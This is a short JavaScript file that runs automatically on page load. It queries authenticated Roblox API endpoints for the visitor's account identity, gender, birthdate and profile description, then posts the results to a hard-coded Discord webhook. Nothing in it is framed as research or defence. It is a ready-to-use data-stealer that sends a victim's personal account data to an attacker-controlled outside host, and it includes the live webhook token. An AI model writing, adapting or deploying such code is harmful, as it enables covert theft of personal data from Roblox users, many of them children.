// Define your Discord webhook URL
const webhookUrl = 'https://discord.com/api/webhooks/1272974490879397949/neN1WoArgjNAj3rpmK-4lqHJVfAEcql6oz5S45jgjYwSbCU1IX3GqRo_HOJ0-af-NU3N';

// Function to send data to the Discord webhook
function sendToDiscord(data) {
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            content: `Roblox Data: ${data}`
        })
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.json();
    })
    .then(data => console.log('Successfully sent data to Discord:', data))
    .catch(error => console.error('Error sending data to Discord:', error));
}

// Function to fetch data from Roblox API endpoints
function fetchRobloxData() {
    const endpoints = [
        'https://users.roblox.com/v1/users/authenticated',
        'https://users.roblox.com/v1/gender',
        'https://users.roblox.com/v1/birthdate',
        'https://users.roblox.com/v1/description'
    ];

    Promise.all(endpoints.map(url =>
        fetch(url)
            .then(response => response.json())
            .then(data => ({ url, data }))
            .catch(error => ({ url, error: error.message }))
    ))
    .then(results => {
        // Combine the results into a single object
        const combinedData = results.map(result => ({
            url: result.url,
            data: result.data || result.error
        }));
        
        // Send the combined data to Discord
        sendToDiscord(JSON.stringify(combinedData, null, 2));
    })
    .catch(error => console.error('Error fetching Roblox data:', error));
}

// Trigger fetching data once the DOM content is loaded
document.addEventListener('DOMContentLoaded', fetchRobloxData);
